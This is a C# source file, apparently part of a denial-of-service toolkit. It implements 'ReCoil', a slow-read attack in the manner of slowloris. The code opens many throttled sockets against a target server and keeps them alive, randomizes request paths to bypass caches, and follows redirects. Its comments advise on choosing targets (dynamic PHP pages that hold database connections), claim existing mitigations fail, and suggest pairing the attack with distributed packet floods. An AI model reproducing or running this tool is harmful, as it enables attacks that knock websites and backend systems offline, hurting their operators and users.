using System;
using System.Collections.Generic;
using System.Net.Sockets;
using System.Threading;
using GAS.Core.Strings;
namespace GAS.Core
{
    /// <summary>
    /// ReCoil basically does a "reverse" DDOS
    /// Requirements: the targeted "file" has to be larger than 24 KB (bigger IS better ;) !)
    /// </summary>
    /// <remarks>
    /// it sends a complete legimit request but throttles the download down to nearly nothing .. just enough to keep the connection alive
    /// the attack-method is basically the same as slowloris ... bind the socket as long as possible and eat up as much as you can
    /// apache servers crash nearly in an instant. this attack however can NOT be mitigated with http-ready and mods like that.
    /// this attack simulates sth like a massive amount of mobile devices running shortly out of coverage (like driving through a tunnel)
    /// 
    /// due to the nature of the congestian-response this could maybe taken a step further to self-feeding congestion-cascades 
    /// if done "properly" in a distributed manner together with packet-floods.(??)
    /// 
    /// Limitations / Disadvantages:
    /// this does NOT work if you are behind anything like a proxy / caching-stuff.
    /// in this implementation however we are bound to the underlying system-/net-buffers ...
    /// due to that the required size of the targeted file differs -.-
    /// Dataflow: {NET} --> {WINSOCK-Buffer} --> ClientSocket .. so we have to make sure the actual data exceeds
    /// the winsock-buffer + clientsocket-buffer, but we can ONLY change the latter.
    /// _from what i could find on a brief search / test the winsock buffer for a 10/100 links lies around 16-18KB
    /// where 1 GBit links have an underlying buffer around 64KB (size really does matter :P )
    /// 
    /// what to target?:
    /// although it might makes sense to target pictures or other large files on the server this doesn't really makes sense!
    /// the server could (and in most cases does - except for apache) always read directly _from the file-stream resulting in nearly 0 needed RAM
    /// --> always target dynamic content! this has to be generated on the fly / pulled fom a DB 
    /// and therefor most likely ends up in the RAM!
    /// 
    /// high-value targets / worst case szenario:
    /// as it seems the echo statement in php writes directly to the socket .. considering this it should be possible to
    /// take down the back-__end infrastructure if the page does an early flush causing the congestation while still holding DB-conns etc.
    /// </remarks>
    public class ReCoil : IAttacker
    {
        private volatile int _port, _nSockets;
        private volatile bool _random, _usegZip, _resp, init = false;
        private Thread[] WorkingThreads;
        private volatile string _dns, _ip, _subSite, DefaultAgent, RandomAgent = "GET {0}{1} HTTP/1.1{2}HOST: {3}{2}User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0){2}Keep-Alive: 300{2}Connection: keep-alive{2}{4}{2}";
        private volatile List<Socket>[] _lSockets;
        /// <summary>
        /// creates the ReCoil object. <.<
        /// </summary>
        /// <param name="dns">DNS string of the target</param>
        /// <param name="ip">IP string of a specific server. Use this ONLY if the target does loadbalancing between different IPs and you want to target a specific IP. normally you want to provide an empty string!</param>
        /// <param name="port">the Portnumber. however so far this class only understands HTTP.</param>
        /// <param name="subsite">the path to the targeted site / document. (remember: the file has to be at least around 24KB!)</param>
        /// <param name="delay">time in milliseconds between the creation of new sockets.</param>
        /// <param name="timeout">time in seconds between request on the same connection. the higher the better .. but should be UNDER the timout _from the server. (30 seemed to be working always so far!)</param>
        /// <param name="random">adds a random string to the subsite so that every new connection requests a new file. (use on searchsites or to bypass the cache / proxy)</param>
        /// <param name="nSockets">the amount of sockets for this object</param>
        /// <param name="usegZip">turns on the gzip / deflate header to check for: CVE-2009-1891 - keep in mind, that the compressed file still has to be larger than ~24KB! (maybe use on large static files like pdf etc?)</param>
        public ReCoil(string dns, string ip, int port, string subSite, int delay, int timeout, bool random, bool resp, int nSockets, bool usegZip,int threadcount)
        {
            ThreadCount = threadcount;
            this.WorkingThreads = new Thread[ThreadCount];
            this.States = new ReqState[ThreadCount];
            this._lSockets = new List<Socket>[ThreadCount];
            this._dns = (dns == "") ? ip : dns; //hopefully they know what they are doing :)
            this._ip = ip;
            this._port = port;
            this._subSite = subSite;
            this._nSockets = nSockets;
            if (timeout <= 0) this.Timeout = 30000; // 30 seconds
            else this.Timeout = timeout * 1000;
            this.Delay = delay + 1;
            this._random = random;
            this._usegZip = usegZip;
            this._resp = resp;
            IsDelayed = true;
            for (int i = 0; i < ThreadCount; i++)
            {
                States[i] = ReqState.Ready;
                _lSockets[i] = new List<Socket>();
            }
            Requested = 0; // we reset this! - meaning of this counter changes in this context!
            DefaultAgent = String.Format("GET {0} HTTP/1.1{1}HOST: {2}{1}User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0){1}Keep-Alive: 300{1}Connection: keep-alive{1}{3}{1}", _subSite, Environment.NewLine, _dns, ((_usegZip) ? ("Accept-Encoding: gzip,deflate" + Environment.NewLine) : ""));
            RandomAgent = String.Format(RandomAgent, _subSite, "{0}", Environment.NewLine, _dns, ((_usegZip) ? ("Accept-Encoding: gzip,deflate" + Environment.NewLine) : ""));
        }
        public override void Start()
        {
            if (IsFlooding) Stop();
            IsFlooding = true;
            for (int i = 0; i < ThreadCount; (WorkingThreads[i] = new Thread(new ParameterizedThreadStart(bw_DoWork))).Start(i++));
            init = true;
        }
        public override void Stop()
        {
            IsFlooding = false;
            foreach (var x in WorkingThreads)
              try { x.Abort(); }
              catch { }
        }
        private void bw_DoWork(object indexinthreads)
        {

            #region Wait 4 full init
            while (!init) Thread.Sleep(100);
            int MY_INDEX_FOR_WORK = (int) indexinthreads;
            #endregion
            #region Attack
            try
            {
                #region Prepare
                int bsize = 16,mincl = 16384; // set minimal content-length to 16KB
                byte[] sbuf = System.Text.Encoding.ASCII.GetBytes(DefaultAgent),rbuf = new byte[bsize];
                States[MY_INDEX_FOR_WORK] = ReqState.Ready;
                var stop = DateTime.Now;
                string redirect = "";
                #endregion
                while (IsFlooding)
                {

                    stop = DateTime.Now.AddMilliseconds(Timeout);
                    States[MY_INDEX_FOR_WORK] = ReqState.Connecting; // SET STATE TO CONNECTING //
                    // forget about slow! .. we have enough saveguards in place!
                    while (IsDelayed && (DateTime.Now < stop))
                    {
                        #region Connect
                        var socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                        socket.ReceiveBufferSize = bsize;
                        try
                        {
                            socket.Connect(((_ip == "") ? _dns : _ip), _port);
                            socket.Blocking = _resp; // beware of shitstorm of 10035 - 10037 errors o.O
                            if (_random) sbuf = System.Text.Encoding.ASCII.GetBytes(String.Format(RandomAgent, Functions.RandomString()));
                            socket.Send(sbuf);
                        }
                        catch { }
                        #endregion
                        #region We connected! Bring it down!
                        if (socket.Connected)
                        {
                            bool keeps = !_resp;
                            #region Response analysis is enabled
                            if (_resp)
                            {
                                #region Process redirects
                                do
                                { // some damn fail checks (and resolving dynamic redirects -.-)
                                    #region On redirect
                                    if (redirect != "")
                                    {
                                        #region Socket is dead -> let recreate it
                                        if (!socket.Connected)
                                        {
                                            socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                                            socket.ReceiveBufferSize = bsize;
                                            socket.Connect(((_ip == "") ? _dns : _ip), _port);
                                        }
                                        #endregion
                                        sbuf = System.Text.Encoding.ASCII.GetBytes(DefaultAgent);
                                        socket.Send(sbuf);
                                        redirect = "";
                                    }
                                    #endregion
                                    keeps = false;
                                    #region Headers
                                    try
                                    {
                                        #region Download headers
                                        string header = "";
                                        while (!header.Contains(Environment.NewLine + Environment.NewLine) && (socket.Receive(rbuf) >= bsize))
                                            header += System.Text.Encoding.ASCII.GetString(rbuf);
                                        string[] sp = header.Split(new string[] { Environment.NewLine }, StringSplitOptions.RemoveEmptyEntries),tsp;
                                        #endregion
                                        #region Process headers
                                        for (int i = (sp.Length - 1); i >= 0; i--)
                                        {
                                            tsp = sp[i].Split(':');
                                            if ((tsp[0] == "Content-Length") && (tsp.Length >= 2))
                                            { // checking if the content-length is long enough to work with this!
                                                int sl = 0;
                                                if (int.TryParse(tsp[1], out sl))
                                                    if (sl >= mincl)
                                                    {
                                                        keeps = true;
                                                        i = -1;
                                                    }
                                            }
                                            else if ((tsp[0] == "Transfer-Encoding") && (tsp.Length >= 2) && (tsp[1].ToLower().Trim() == "chunked"))
                                            {
                                                keeps = true; //well, what doo?
                                                i = -1;
                                            }
                                            else if ((tsp[0] == "Location") && (tsp.Length >= 2))
                                            { // follow the redirect
                                                redirect = tsp[1].Trim();
                                                i = -1;
                                            }
                                        }
                                        #endregion
                                    }
                                    catch { }
                                    #endregion
                                }
                                while ((redirect != "") && (DateTime.Now < stop));
                                #endregion
                                if (!keeps)
                                    Failed++;
                            }
#endregion
                            #region Do not wait for response
                            if (keeps)
                            {
                                socket.Blocking = true; // we rely on this in the dl-loop!
                                _lSockets[MY_INDEX_FOR_WORK].Insert(0, socket);
                                Requested++;
                            }
                            #endregion
                        }
#endregion
                        #region Some checks
                        if (_lSockets[MY_INDEX_FOR_WORK].Count >= _nSockets) IsDelayed = false;
                        else if (Delay > 0) System.Threading.Thread.Sleep(Delay);
                        #endregion
                    }
                    States[MY_INDEX_FOR_WORK] = ReqState.Downloading;
                    #region keep the sockets alive
                    for (int i = (_lSockets[MY_INDEX_FOR_WORK].Count - 1); i >= 0; i--)
                    { 
                        try
                        {
                            // here's the downfall: if the server at one point decides to just discard the socket 
                            // and not close / reset the connection we are stuck with a half-closed connection
                            // testing for it doesn't work, because the server than resets the connection in order
                            // to respond to the new request ... so we have to rely on the connection timeout!
                            #region Connect and remove dead
                            if (!_lSockets[MY_INDEX_FOR_WORK][i].Connected || (_lSockets[MY_INDEX_FOR_WORK][i].Receive(rbuf) < bsize))
                            {
                                _lSockets[MY_INDEX_FOR_WORK].RemoveAt(i);
                                Failed++;
                                Requested--; // the "requested" number in the stats shows the actual open sockets
                            }
                            #endregion
                            else Downloaded++;
                        }
                        catch
                        {
                            _lSockets[MY_INDEX_FOR_WORK].RemoveAt(i);
                            Failed++;
                            Requested--;
                        }
                    }
                            #endregion
                    #region stats
                    States[MY_INDEX_FOR_WORK] = ReqState.Completed;
                    IsDelayed = (_lSockets[MY_INDEX_FOR_WORK].Count < _nSockets);
                    if (!IsDelayed) System.Threading.Thread.Sleep(Timeout);
                    #endregion
                }
            }
            catch { States[MY_INDEX_FOR_WORK] = ReqState.Failed; }
            #endregion
            #region Cleanup
            finally
            {
                IsFlooding = false;// not so sure about the graceful shutdown ... but why not?
                for (int i = (_lSockets[MY_INDEX_FOR_WORK].Count - 1); i >= 0; i--)
                    try { _lSockets[MY_INDEX_FOR_WORK][i].Close(); }
                    catch { }
                _lSockets[MY_INDEX_FOR_WORK].Clear();
                States[MY_INDEX_FOR_WORK] = ReqState.Ready;
                IsDelayed = true;
            }
            #endregion
        }
    }
}